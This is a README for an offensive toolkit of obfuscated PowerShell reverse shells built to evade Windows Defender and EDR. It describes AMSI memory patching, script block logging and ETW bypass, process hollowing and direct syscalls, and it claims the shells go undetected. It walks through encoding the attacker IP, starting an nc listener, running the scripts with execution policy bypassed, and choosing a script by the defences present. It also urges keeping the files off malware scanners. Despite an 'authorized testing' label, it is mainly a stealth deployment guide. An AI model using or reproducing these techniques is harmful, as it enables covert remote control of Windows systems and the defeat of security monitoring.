
# Obfuscated PowerShell Reverse Shells

  

Collection of obfuscated PowerShell reverse shells with AV/EDR evasion techniques for authorized security testing.
Bypass Defender

  

## Warning

  

**Authorized testing only. Illegal use prohibited.**

  

Do **NOT** upload these files to public malware-scanning services such as VirusTotal or HybridAnalysis. Doing so may compromise testing objectives and reduce effectiveness.

  

## Structure

  

```

reverse-shells/

├── scripts/ # PowerShell reverse shell scripts

├── docs/ # Documentation and license

└── tools/ # Utility tools

```

  

## Scripts

  

### reverse_shell.ps1

Basic PowerShell reverse shell with Base64 obfuscation. Uses .NET reflection and encoded IP/port configuration. Suitable for environments without EDR.

  

**Features:**

- Base64 obfuscation for IP and port

- .NET reflection techniques

- Simple TCP connection

 <img width="2549" height="1372" alt="image" src="https://github.com/user-attachments/assets/e0961a4a-40ea-4467-9cfe-e62ec33b7482" />
 

### reverse_shell_dll_memory.ps1

Advanced reverse shell with in-memory DLL compilation and loading. No files written to disk during execution.

  

**Features:**

- C# compilation in memory via `csc.exe` or `Add-Type`

- Reflective DLL loading via `Assembly.Load(byte[])`

- Automatic reconnection with retry logic

- Background thread execution

- Compatible Windows 11 24h2

 <img width="2542" height="1372" alt="image" src="https://github.com/user-attachments/assets/00b3aa06-d065-4a47-84d9-4ff1b05ddc38" />
 

### reverse_shell_dll_memory_edr_bypass.ps1

Complete EDR bypass solution with AMSI and PowerShell Logging evasion. Maximum stealth for protected environments.

  

**Features:**

- All features from `reverse_shell_dll_memory.ps1`

- AMSI bypass via memory patch (Base64 encoded)

- PowerShell Script Block Logging bypass

- ETW event tracing disabled

- Undetectable by Windows Defender

  <img width="2525" height="1377" alt="image" src="https://github.com/user-attachments/assets/5de3c21c-705b-4eb0-842e-70cba99cfc91" />


### reverse_shell_inmemory_syscall_loader.ps1

Process Hollowing implementation using direct syscalls. Creates suspended process and replaces memory with shellcode.

  

**Features:**

- In-memory shellcode execution

- Direct syscalls (NtCreateThreadEx, NtQueryInformationProcess)

- ETW patching (multiple functions)

- Basic EDR surface reduction

- Self-process injection

  <img width="2541" height="1321" alt="image" src="https://github.com/user-attachments/assets/c4c420bc-4ecd-4561-8f9a-e7cbd2fc3466" />


### reverse_shell_inmemory_syscall_loader_advanced.ps1

Advanced process injection with multiple techniques and EDR evasion.

  

**Features:**

- Direct syscall usage

- In-memory shellcode execution

- ETW patching / télémétrie réduite

- Basic EDR surface reduction (syscalls + ETW patch)

- Self-process injection

  <img width="2538" height="1354" alt="image" src="https://github.com/user-attachments/assets/b8dcf04d-d183-4985-a517-af75fbfa0817" />


## Quick Start

  

### 1. Configure IP and Port

  

Encode IP to Base64:

```powershell

[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("192.168.1.100"))

```

  

Calculate port (example: 4444):

```powershell

[Math]::Pow(2,2) + [Math]::Pow(2,3) + [Math]::Pow(2,4) + [Math]::Pow(2,6) + [Math]::Pow(2,8) + [Math]::Pow(2,12)

```

  

Modify in script (line ~6-7):

```powershell

$ipB  = [Convert]::FromBase64String('YOUR_IP_BASE64');

$prt  = [int](([Math]::Pow(2,2) + [Math]::Pow(2,3) + [Math]::Pow(2,4) + [Math]::Pow(2,6) + [Math]::Pow(2,8) + [Math]::Pow(2,12)));

```

  

### 2. Start Listener

  

```bash

nc  -nlvp  4444

```

  

### 3. Execute Script

  

```powershell

cd scripts

.\reverse_shell_dll_memory_edr_bypass.ps1

```


  

## Usage Recommendations

  

**Basic environment (no EDR):** Use `reverse_shell.ps1`

  

**Windows Defender present:** Use `reverse_shell_dll_memory.ps1`

  

**EDR/AMSI protection:** Use `reverse_shell_dll_memory_edr_bypass.ps1`

  

**Maximum stealth required:** Use `reverse_shell_process_hollowing_syscallsv2.ps1`

  

## Troubleshooting

  

**Connection refused:** Verify listener is active, check IP/port in script, verify firewall rules

  

**Script closes immediately:** Use `reverse_shell_dll_memory.ps1` or `reverse_shell_dll_memory_edr_bypass.ps1` for better stability

  

**C# compilation error:** Script automatically falls back to `Add-Type` if `csc.exe` unavailable. Ensure .NET Framework 4.0+ is installed.

  

**Execution policy error:**

```powershell

powershell.exe  -ExecutionPolicy Bypass -File .\reverse_shell_dll_memory_edr_bypass.ps1

```

  

## Technical Details

  

- Tested on Windows 11 24h2

- Windows Defender: Not detected

- EDR detection: Varies by product and version

- All payloads execute in memory (no files on disk)

- Base64 obfuscation for configuration

- All are undetectable by Defender


  

## Tools

  

**prepare_for_github.ps1** - Replaces hardcoded IPs with placeholders before GitHub publication

  
